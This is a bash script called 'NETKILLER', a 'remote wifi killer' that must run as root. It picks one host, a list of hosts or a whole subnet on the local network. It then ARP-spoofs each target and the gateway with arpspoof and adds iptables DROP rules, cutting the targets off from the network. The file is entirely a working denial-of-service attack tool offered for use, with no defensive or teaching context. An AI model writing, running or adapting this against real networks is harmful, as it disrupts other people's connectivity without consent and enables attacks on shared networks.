#!/bin/bash

echo -e "\e[1;91m"
echo "
       ███╗   ██╗███████╗████████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
       ████╗  ██║██╔════╝╚══██╔══╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
       ██╔██╗ ██║█████╗     ██║   █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
       ██║╚██╗██║██╔══╝     ██║   ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
       ██║ ╚████║███████╗   ██║   ██║  ██╗██║███████╗███████╗███████╗██║  ██║
       ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                              remote wifi killer
"

echo -e "\e[1;92mAuthor:[x!v3r] github.com/xiv3r \e[0m"

echo -e "\e[0m"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi


echo ""
# Detect interface
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)

# Detect gateway
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')

# Detect subnet
CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')

# Detect device IP
MYIP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
echo ""

echo "Current Network Configurations"
echo "[*] Network Interface: $WLAN"
echo "[*] Gateway IP: $GW"
echo "[*] Subnet IP: $CIDR"
echo "[*] Your IP: $IP"
echo " "


read -p "Enter Wireless Interface: " INTERFACE
echo ""

read -p "Enter Router Gateway IP: " GATEWAY
echo ""

read -p "Enter Subnet Mask: " NETWORK_CIDR
echo ""

read -p "Enter Device IP: " MYIP
echo " "

echo "Your Network Configuration"
echo "[*] Network Interface: $INTERFACE"
echo "[*] Gateway IP: $GATEWAY"
echo "[*] Subnet IP: $NETWORK_CIDR"
echo "[*] Your IP: $MYIP"
echo " "

# Target selection
echo "Select Attack Type:"
echo "1) Single Target IP"
echo "2) Multiple Target IP's (comma separated)"
echo "3) Target All IP's in Subnet"
echo ""
read -p "Enter choice [1-3]: " target_type
echo ""

case $target_type in
    1)
        echo "Single Target User IP: e.g 10.0.0.123"
        read -p "Enter User IP: " TARGET
        TARGETS=($TARGET)
        ;;
    2)
        echo "Multiple Target User IP's: e.g 10.0.0.123,10.0.0.124"
        read -p "Enter Multiple Users IP's:  " target_input
        IFS=',' read -ra TARGETS <<< "$target_input"
        ;;
    3)
        echo "Target All Users IP's in Subnet: e.g 10.0.0.1/20"
        read -p "Enter Subnet: " subnet

        # Validate subnet
        if ! ipcalc -n "$subnet" &>/dev/null; then
            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20"
            exit 1
        fi

        # Get network range using ipcalc
        NETWORK_INFO=$(ipcalc -n "$subnet")
        NETWORK_ADDR=$(echo "$NETWORK_INFO" | grep 'Network:' | awk '{print $2}' | cut -d'/' -f1)
        NETMASK=$(echo "$NETWORK_INFO" | grep 'Netmask:' | awk '{print $2}')
        BROADCAST=$(echo "$NETWORK_INFO" | grep 'Broadcast:' | awk '{print $2}')
        FIRST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMin:' | awk '{print $2}')
        LAST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMax:' | awk '{print $2}')


        # Generate all IPs in range except gateway and our IP
        IFS=. read -r i1 i2 i3 i4 <<< "$FIRST_HOST"
        IFS=. read -r <<< "$LAST_HOST" l1 l2 l3 l4

        TARGETS=()
        for ((a=i1; a<=l1; a++)); do
            for ((b=i2; b<=l2; b++)); do
                for ((c=i3; c<=l3; c++)); do
                    for ((d=i4; d<=l4; d++)); do
                        ip="$a.$b.$c.$d"
                        # Skip network, broadcast, gateway and our IP
                        if [[ "$ip" != "$NETWORK_ADDR" && "$ip" != "$BROADCAST" && "$ip" != "$GATEWAY" && "$ip" != "$MYIP" ]]; then
                            TARGETS+=("$ip")
                        fi
                    done
                done
            done
        done

        if [ ${#TARGETS[@]} -eq 0 ]; then
            echo "No valid targets found in subnet."
            exit 1
        fi

       echo ""
       echo "Found ${#TARGETS[@]} potential targets in subnet"

        # Option to exempt additional IPs
        echo ""
        read -p "Do you want to exempt any additional IP's from the subnet? (y/n) " exempt_choice
        if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
            echo ""
            echo "Enter IP's to exempt: e.g 10.0.0.110,10.0.0.120"
            read -p "> " exempt_input
            IFS=',' read -ra EXEMPTS <<< "$exempt_input"

            # Remove exempt IPs from targets
            NEW_TARGETS=()
            for target in "${TARGETS[@]}"; do
                skip=
                for exempt in "${EXEMPTS[@]}"; do
                    if [[ "$target" == "$exempt" ]]; then
                        skip=1
                        break
                    fi
                done
                [[ -z $skip ]] && NEW_TARGETS+=("$target")
            done
            TARGETS=("${NEW_TARGETS[@]}")
            echo ""
            echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
        fi
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

if [ ${#TARGETS[@]} -eq 0 ]; then
    echo "No valid targets specified."
    exit 1
fi

# Confirm before proceeding
echo -e "\nNumber of targets IP's to affect: ${#TARGETS[@]}"
echo ""
read -p "Are you sure you want to continue? (y/n) " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Aborted."
    exit 0
fi

# Start ARP spoofing for each target
PIDS=()
for TARGET in "${TARGETS[@]}"; do
    echo ""
    echo "Netkiller killing the connection for $TARGET"
    arpspoof -i $INTERFACE -t $TARGET $GATEWAY >/dev/null 2>&1 &
    PIDS+=($!)
    arpspoof -i $INTERFACE -t $GATEWAY $TARGET >/dev/null 2>&1 &
    PIDS+=($!)

    # Set iptables rules to block/drop traffic
    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
    iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
    iptables -I FORWARD -s $TARGET -j DROP
    iptables -I FORWARD -d $TARGET -j DROP
done

# Function to clean up
cleanup() {
    echo -e "\nCleaning up..."
    # Kill all arpspoof processes
    for pid in "${PIDS[@]}"; do
        kill -9 $pid >/dev/null 2>&1
    done

    # Flush iptables rules
    iptables -D FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP 2>/dev/null
    iptables -D FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP 2>/dev/null
    for TARGET in "${TARGETS[@]}"; do
        iptables -D FORWARD -s $TARGET -j DROP 2>/dev/null
        iptables -D FORWARD -d $TARGET -j DROP 2>/dev/null
    done
    echo "Done. iptables rules removed and processes stopped."
}

# Trap Ctrl+C
trap cleanup EXIT

echo -e "\nNetkiller attack running. Press Ctrl+C to stop..."
while true; do
    sleep 1
done
